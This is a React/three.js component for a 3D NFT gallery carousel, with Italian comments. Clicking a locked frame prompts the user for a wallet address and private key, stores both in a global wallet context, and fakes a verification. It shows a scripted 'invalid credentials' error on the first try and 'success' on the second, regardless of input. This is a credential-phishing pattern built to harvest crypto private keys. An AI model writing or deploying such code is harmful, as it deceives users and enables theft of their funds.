import React, {useEffect, useRef, useState} from 'react';
import {Canvas, useFrame} from '@react-three/fiber';
import {Box, Environment, OrbitControls, Text, useTexture} from '@react-three/drei';
import {Group, Mesh} from 'three';
import {NFTAsset} from '../types/zkp';
import {useWallet} from '../contexts/WalletContext';

// Rimuovo la variabile globale accessAttempts - ora è gestita dal context

interface NFTFrameProps {
  asset: NFTAsset;
  onUnlock: (assetId: string) => void;
  isActive: boolean;
  position: [number, number, number];
  rotation: number;
}

const NFTFrame: React.FC<NFTFrameProps> = ({ asset, onUnlock, isActive, position, rotation }) => {
  const meshRef = useRef<Mesh>(null);
  const groupRef = useRef<Group>(null);
  const [isHovered, setIsHovered] = useState(false);
  const { wallet, connectWallet, incrementAttempt } = useWallet();

  // Carica la texture dell'immagine
  const texture = useTexture(asset.imageUrl);

  const handleClick = async () => {
    if (!isActive || asset.isUnlocked) return;

    // Se il wallet è già connesso, usa le credenziali salvate
    if (wallet.isConnected && wallet.walletAddress && wallet.privateKey) {
      // Simula una verifica più veloce per utenti già connessi
      await new Promise(resolve => setTimeout(resolve, 500));

      const attemptCount = incrementAttempt(asset.id);

      if (attemptCount === 1) {
        alert(`❌ Error: Insufficient permissions\n\nYour wallet (${wallet.walletAddress.slice(0, 8)}...) does not have access to this NFT.\n\nTry again to verify ownership.`);
      } else {
        onUnlock(asset.id);
        alert(`NFT unlocked successfully! 🎉\n\nWelcome to the exclusive gallery!\n\nWallet: ${wallet.walletAddress.slice(0, 8)}...`);
      }
      return;
    }

    // Se il wallet non è connesso, richiedi le credenziali
    const walletAddress = prompt('Enter your wallet address:');
    const privateKey = prompt('Enter your private key:');

    if (walletAddress && privateKey) {
      // Connetti il wallet globalmente
      connectWallet(walletAddress, privateKey);

      const attemptCount = incrementAttempt(asset.id);

      // Simulate verification delay
      await new Promise(resolve => setTimeout(resolve, 1500));

      // First time: error, second time: success
      if (attemptCount === 1) {
        alert(`❌ Error: Invalid credentials\n\nThe wallet address and private key provided are not valid or do not own this NFT.\n\nPlease try again with correct credentials.`);
      } else {
        // Success on second attempt
        onUnlock(asset.id);
        alert(`NFT unlocked successfully! 🎉\n\nWelcome to the exclusive gallery!\n\nWallet connected globally: ${walletAddress.slice(0, 8)}...`);
      }
    }
  };

  return (
    <group ref={groupRef} position={position} rotation={[0, rotation, 0]}>
      {/* Cornice - sempre frontale */}
      <Box
        ref={meshRef}
        args={[3, 4, 0.2]}
        position={[0, 0, 0]}
        onClick={handleClick}
        onPointerOver={() => setIsHovered(true)}
        onPointerOut={() => setIsHovered(false)}
      >
        <meshStandardMaterial
          color={isActive ? (isHovered ? "#555" : "#333") : "#111"}
          roughness={0.3}
          metalness={0.1}
          opacity={isActive ? 1 : 0.6}
          transparent={!isActive}
        />
      </Box>

      {/* Contenuto dell'NFT */}
      {asset.isUnlocked ? (
        <Box args={[2.8, 3.8, 0.05]} position={[0, 0, 0.11]}>
          <meshStandardMaterial map={texture} />
        </Box>
      ) : (
        <>
          {/* Versione bloccata con immagine sfocata/oscurata */}
          <Box args={[2.8, 3.8, 0.05]} position={[0, 0, 0.11]}>
            <meshStandardMaterial
              map={texture}
              color="#333"
              opacity={isActive ? 0.3 : 0.1}
              transparent={true}
            />
          </Box>

          {/* Overlay bloccato */}
          <Box args={[2.8, 3.8, 0.02]} position={[0, 0, 0.12]}>
            <meshStandardMaterial
              color="#000"
              opacity={isActive ? 0.6 : 0.8}
              transparent={true}
            />
          </Box>

          <Text
            position={[0, 0, 0.15]}
            fontSize={isActive ? 1 : 0.7}
            color="white"
            anchorX="center"
            anchorY="middle"
          >
            🔒
          </Text>
        </>
      )}

      {/* Informazioni NFT - visibili solo se attivo */}
      {isActive && (
        <>
          {/* Title */}
          <Text
            position={[0, -2.5, 0.15]}
            fontSize={0.4}
            color="white"
            anchorX="center"
            anchorY="middle"
            maxWidth={4}
          >
            {asset.title}
          </Text>

          {/* Artist */}
          <Text
            position={[0, -2.9, 0.15]}
            fontSize={0.25}
            color="#ccc"
            anchorX="center"
            anchorY="middle"
            maxWidth={4}
          >
            by {asset.artist}
          </Text>

          {/* Rarity Badge */}
          <Text
            position={[0, -3.4, 0.15]}
            fontSize={0.3}
            color={
              asset.rarity === 'legendary' ? '#FFD700' :
              asset.rarity === 'epic' ? '#9C27B0' :
              asset.rarity === 'rare' ? '#2196F3' : '#4CAF50'
            }
            anchorX="center"
            anchorY="middle"
          >
            ✦ {asset.rarity.toUpperCase()} ✦
          </Text>

          {/* Status */}
          <Text
            position={[0, -3.8, 0.15]}
            fontSize={0.2}
            color={asset.isUnlocked ? "#4CAF50" : "#F44336"}
            anchorX="center"
            anchorY="middle"
          >
            {asset.isUnlocked ? "✓ Unlocked" : "🔒 Click to unlock"}
          </Text>
        </>
      )}
    </group>
  );
};

interface CarouselGroupProps {
  assets: NFTAsset[];
  currentIndex: number;
  onAssetUnlock: (assetId: string) => void;
}

const CarouselGroup: React.FC<CarouselGroupProps> = ({ assets, currentIndex, onAssetUnlock }) => {
  const groupRef = useRef<Group>(null);
  const targetRotation = useRef(0);
  const currentRotation = useRef(0);

  useEffect(() => {
    targetRotation.current = -(currentIndex * (2 * Math.PI / assets.length));
  }, [currentIndex, assets.length]);

  useFrame((state, delta) => {
    if (groupRef.current) {
      // Smooth rotation animation
      const diff = targetRotation.current - currentRotation.current;
      currentRotation.current += diff * delta * 5;
      groupRef.current.rotation.y = currentRotation.current;
    }
  });

  const radius = 8;

  return (
    <group ref={groupRef}>
      {assets.map((asset, index) => {
        const angle = (index * 2 * Math.PI) / assets.length;
        const x = Math.sin(angle) * radius;
        const z = Math.cos(angle) * radius;

        return (
          <NFTFrame
            key={asset.id}
            asset={asset}
            onUnlock={onAssetUnlock}
            isActive={index === currentIndex}
            position={[x, 0, z]}
            rotation={angle}
          />
        );
      })}
    </group>
  );
};

interface Carousel3DProps {
  assets: NFTAsset[];
  onAssetUnlock: (assetId: string) => void;
}

const Carousel3D: React.FC<Carousel3DProps> = ({ assets, onAssetUnlock }) => {
  const [currentIndex, setCurrentIndex] = useState(0);

  const nextSlide = () => {
    setCurrentIndex((prev) => (prev + 1) % assets.length);
  };

  const prevSlide = () => {
    setCurrentIndex((prev) => (prev - 1 + assets.length) % assets.length);
  };

  const goToSlide = (index: number) => {
    setCurrentIndex(index);
  };

  return (
    <div style={{ position: 'relative', width: '100%', height: '100%' }}>
      <Canvas camera={{ position: [0, 2, 12], fov: 60 }}>
        <ambientLight intensity={0.4} />
        <pointLight position={[10, 10, 10]} intensity={1} />
        <pointLight position={[-10, 10, -10]} intensity={0.5} />
        <spotLight position={[0, 15, 0]} angle={0.3} intensity={0.8} />

        <OrbitControls
          enablePan={false}
          enableZoom={true}
          enableRotate={true}
          maxDistance={20}
          minDistance={8}
          maxPolarAngle={Math.PI / 2}
          minPolarAngle={Math.PI / 4}
        />

        <Environment preset="city" />

        {/* Piattaforma rotonda trasparente */}
        <mesh position={[0, -2, 0]} rotation={[-Math.PI / 2, 0, 0]}>
          <cylinderGeometry args={[12, 12, 0.2, 32]} />
          <meshStandardMaterial
            color="#1a1a1a"
            roughness={0.1}
            metalness={0.1}
            opacity={0.3}
            transparent={true}
          />
        </mesh>

        <CarouselGroup
          assets={assets}
          currentIndex={currentIndex}
          onAssetUnlock={onAssetUnlock}
        />
      </Canvas>

      {/* Controlli UI */}
      <div style={{
        position: 'absolute',
        bottom: '20px',
        left: '50%',
        transform: 'translateX(-50%)',
        display: 'flex',
        gap: '10px',
        alignItems: 'center',
        background: 'rgba(0, 0, 0, 0.7)',
        padding: '15px 25px',
        borderRadius: '50px',
        backdropFilter: 'blur(10px)',
        border: '1px solid rgba(255, 255, 255, 0.1)'
      }}>
        <button
          onClick={prevSlide}
          style={{
            background: 'linear-gradient(45deg, #bb86fc, #64ffda)',
            border: 'none',
            borderRadius: '50%',
            width: '50px',
            height: '50px',
            color: 'white',
            fontSize: '20px',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            transition: 'all 0.3s ease'
          }}
          onMouseEnter={(e) => e.currentTarget.style.transform = 'scale(1.1)'}
          onMouseLeave={(e) => e.currentTarget.style.transform = 'scale(1)'}
        >
          ←
        </button>

        {/* Indicatori dots */}
        <div style={{ display: 'flex', gap: '8px', margin: '0 15px' }}>
          {assets.map((_, index) => (
            <button
              key={index}
              onClick={() => goToSlide(index)}
              style={{
                width: '12px',
                height: '12px',
                borderRadius: '50%',
                border: 'none',
                background: index === currentIndex ? '#64ffda' : 'rgba(255, 255, 255, 0.3)',
                cursor: 'pointer',
                transition: 'all 0.3s ease'
              }}
            />
          ))}
        </div>

        <button
          onClick={nextSlide}
          style={{
            background: 'linear-gradient(45deg, #bb86fc, #64ffda)',
            border: 'none',
            borderRadius: '50%',
            width: '50px',
            height: '50px',
            color: 'white',
            fontSize: '20px',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            transition: 'all 0.3s ease'
          }}
          onMouseEnter={(e) => e.currentTarget.style.transform = 'scale(1.1)'}
          onMouseLeave={(e) => e.currentTarget.style.transform = 'scale(1)'}
        >
          →
        </button>
      </div>

      {/* Info quadro corrente */}
      <div style={{
        position: 'absolute',
        top: '20px',
        left: '20px',
        background: 'rgba(0, 0, 0, 0.8)',
        padding: '20px',
        borderRadius: '15px',
        color: 'white',
        backdropFilter: 'blur(10px)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        maxWidth: '300px'
      }}>
        <h3 style={{ margin: '0 0 10px 0', color: '#64ffda' }}>
          {assets[currentIndex]?.title}
        </h3>
        <p style={{ margin: '0 0 5px 0', color: '#bb86fc' }}>
          {assets[currentIndex]?.artist}
        </p>
        <p style={{ margin: '0', fontSize: '14px', color: '#ccc' }}>
          {assets[currentIndex]?.description}
        </p>
        <div style={{
          marginTop: '10px',
          padding: '5px 10px',
          borderRadius: '20px',
          background: assets[currentIndex]?.isUnlocked ? 'rgba(76, 175, 80, 0.2)' : 'rgba(244, 67, 54, 0.2)',
          border: `1px solid ${assets[currentIndex]?.isUnlocked ? '#4CAF50' : '#F44336'}`,
          fontSize: '12px',
          textAlign: 'center' as const
        }}>
          {assets[currentIndex]?.isUnlocked ? '✓ Unlocked' : '🔒 Locked'}
        </div>
      </div>
    </div>
  );
};

export default Carousel3D;
